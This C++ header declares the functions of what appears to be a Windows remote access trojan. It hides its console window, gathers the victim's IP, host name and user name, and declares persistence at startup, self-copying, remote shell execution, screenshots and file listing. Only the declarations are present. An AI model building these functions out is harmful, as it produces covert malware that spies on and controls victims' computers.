#pragma once
#ifndef _TCPSOCKET_H_
#define _TCPSOCKET_H_
#define _CRT_SECURE_NO_WARNINGS 1
#define _WINSOCK_DEPRECATED_NO_WARNINGS 1
#include <io.h>
#include <stdlib.h>
#include <vector>
#include <fstream>  //ifstream
#include <string>   //包含getline()
#include <cmath>
#include <iostream>
#include <cstdlib>
#include <stdio.h>
#include <tchar.h>
#include <thread>
#include <atlimage.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#ifdef _MSC_VER  
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
#endif

//不显示控制台黑色窗口
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define PORT 65533
#define err(errMsg) printf("[line: %d]%s failed code %d\n", __LINE__, errMsg, WSAGetLastError())
#define FileNameRow 200		//定义获取文件名的二维数组大小
#define FileNameCol 50

using namespace std;

struct PC_Message
{
	char PCName[40];
	TCHAR UserName[40];
	char IP[16];
};
//打开网络库
bool init_Socket();
//关闭网络库
bool close_Socket();
//创建服务端socket
SOCKET CreatServerScoket();
//创建客户端socket
SOCKET CreatClientScoket(const char* ip);
//获取目标计算机的IP，计算机名以及用户名
bool getmessage(struct PC_Message* messages);
//将TCHAR的类型转换为char
bool TcharToChar(const TCHAR* tchar, char* _char);
//心跳功能
bool HeartBeat(SOCKET fd);
//base58编码函数
void base58encode(char plainText[]);
//base58解码函数
bool base58decode(unsigned char* src);
//base64编码函数
void base64encode(char* str);
//base64解码函数
void base64decode(char* str);
//加密函数
void encode(char* text);
//解密函数
void decode(char* pwd);
//开机自启动
int ComputerStart(char* pathName);
//自我复制
int copySelf(char* path);
//执行shell指令
int cmd(char* cmdStr, char* message);
//获取桌面截图
void ScreenShot(LPCTSTR s);
////打开文件
//void readSrc(SOCKET fd);
//获取文件名
void GetFileName(char FileName[FileNameRow][FileNameCol]);

#endif // !_TCPSOCKET_H